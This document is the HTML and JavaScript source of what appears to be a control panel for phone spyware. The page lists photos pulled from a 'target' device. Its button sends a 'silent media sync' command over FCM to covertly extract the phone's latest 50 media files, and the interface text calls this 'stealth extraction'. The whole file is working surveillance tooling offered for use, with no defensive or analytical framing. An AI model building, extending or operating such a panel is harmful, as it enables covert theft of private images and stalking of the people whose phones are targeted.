<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RS Phone - Secure Gallery Vault</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #121212; color: #ffffff; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .back-btn { background: #2a2a2a; border: none; border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #fff; text-decoration: none; }
        .btn { padding: 10px 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; background: #9b59b6; color: white; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
        .btn:hover { background: #8e44ad; }
        
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .gallery-item { background: #1e1e1e; border-radius: 8px; overflow: hidden; border: 1px solid #333; position: relative; aspect-ratio: 1; }
        .gallery-item img { width: 100%; height: 100%; object-fit: cover; }
        .item-meta { position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.8); padding: 8px; font-size: 11px; color: #ccc; }
        .no-data { grid-column: 1 / -1; text-align: center; color: #888; padding: 40px; background: #1e1e1e; border-radius: 8px; }
    </style>
</head>
<body>

    <div class="header">
        <div class="header-left">
            <a href="/remote-center" class="back-btn"><i data-lucide="chevron-left"></i></a>
            <div>
                <h2>Gallery Vault</h2>
                <div style="font-size: 12px; color: #888; margin-top: 4px;" id="device-status">Connecting to target...</div>
            </div>
        </div>
        <div>
            <button class="btn" onclick="triggerGallerySync()">
                <i data-lucide="refresh-cw" style="width:16px;"></i> Force Sync Gallery
            </button>
        </div>
    </div>

    <div class="gallery-grid" id="gallery-grid">
        <div class="no-data">Fetching media vault records...</div>
    </div>

    <script>
        lucide.createIcons();
        const deviceId = localStorage.getItem('active_device_id');
        const token = localStorage.getItem('owner_token');

        if (!deviceId) alert("Critical: No active target selected!");
        document.getElementById('device-status').innerText = `Target ID: ${deviceId}`;

        // 1. Fetch Rendered Gallery from Backend
        async function fetchGallery() {
            try {
                const res = await fetch(`/api/devices/${deviceId}/gallery`);
                const result = await res.json();
                
                const grid = document.getElementById('gallery-grid');
                grid.innerHTML = '';

                if (result.data && result.data.length > 0) {
                    result.data.forEach(media => {
                        const dateObj = new Date(media.created_at);
                        const dateStr = `${dateObj.toLocaleDateString()} ${dateObj.toLocaleTimeString()}`;
                        
                        grid.innerHTML += `
                            <div class="gallery-item">
                                <a href="${media.file_url}" target="_blank">
                                    <img src="${media.file_url}" alt="${media.file_name}" loading="lazy">
                                </a>
                                <div class="item-meta">
                                    <strong>${media.file_name.substring(0, 20)}...</strong><br>
                                    Synced: ${dateStr}
                                </div>
                            </div>
                        `;
                    });
                } else {
                    grid.innerHTML = `<div class="no-data">No media found. Click "Force Sync Gallery" to initiate stealth extraction.</div>`;
                }
            } catch (e) {
                console.error("Fetch error:", e);
            }
        }

        // 2. FCM Trigger: Force Sync Gallery
        async function triggerGallerySync() {
            if (!confirm(`Deploy silent media sync protocol? This will extract the latest 50 media files.`)) return;
            try {
                const res = await fetch(`/api/devices/${deviceId}/action`, {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: `SYNC_GALLERY` })
                });
                const result = await res.json();
                if(result.status === 'success') {
                    alert("Gallery sync deployed via FCM. Phone is processing. Refresh page in 10-20 seconds.");
                } else alert("Dispatch failed: " + result.message);
            } catch(e) { alert("Network exception."); }
        }

        // Init
        fetchGallery();
    </script>
</body>
</html>
